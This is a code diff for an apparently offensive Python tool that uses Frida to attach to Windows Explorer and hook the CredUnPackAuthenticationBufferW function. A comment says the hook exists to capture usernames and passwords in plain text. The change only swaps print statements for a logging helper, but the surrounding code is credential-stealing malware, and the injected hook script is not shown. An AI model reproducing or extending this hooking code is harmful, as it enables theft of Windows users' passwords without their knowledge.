@@ -1,6 +1,12 @@
-from PyHook import wait_for_process, on_credential_submit
+from PyHook import wait_for_process, on_credential_submit, log
 import frida
 import sys
+
+hook_process_name = "explorer"
+
+
+def logger(message):
+    log(hook_process_name, message)
 
 
 def wait_for():
@@ -9,9 +15,9 @@ def wait_for():
 
 def hook():
     try:
-        print("[ explorer-hook ] Trying To Attach To Explorer")
+        logger("Trying To Hook Into Explorer")
         session = frida.attach("explorer.exe")
-        print("[ explorer-hook ] Attached To Explorer!")
+        logger(f"Hooked Explorer")
 
         # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
         script = session.create_script("""
@@ -47,5 +53,5 @@ def hook():
         sys.stdin.read()
 
     except Exception as e:
-        print("[ explorer-hook ] Unhandled exception: " + str(e))
-        print("[ explorer-hook ] Continuing...")
+        logger("Unhandled exception: " + str(e))
+        logger("Continuing...")
